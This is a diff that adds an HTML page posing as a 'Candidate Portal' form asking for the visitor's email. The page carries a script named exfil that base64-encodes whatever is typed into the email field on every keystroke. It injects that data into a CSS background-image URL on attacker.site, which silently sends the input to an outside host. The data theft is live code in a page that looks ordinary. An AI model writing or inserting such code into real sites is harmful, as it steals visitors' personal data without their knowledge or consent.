@@ -1,0 +1,19 @@
+<html>
+<head>
+  <title>Candidate Portal</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <h2>Welcome Candidate</h2>
+  <p>Please fill out your details below:</p>
+  <input type="text" id="email" placeholder="Enter email" oninput="exfil(this.value)">
+  <script>
+    function exfil(value) {
+      // CSS-exfil hook triggered by JS
+      const style = document.createElement("style");
+      style.innerHTML = `body { background-image: url("http://attacker.site/data-exfil/${btoa(value)}"); }`;
+      document.head.appendChild(style);
+    }
+  </script>
+</body>
+</html>
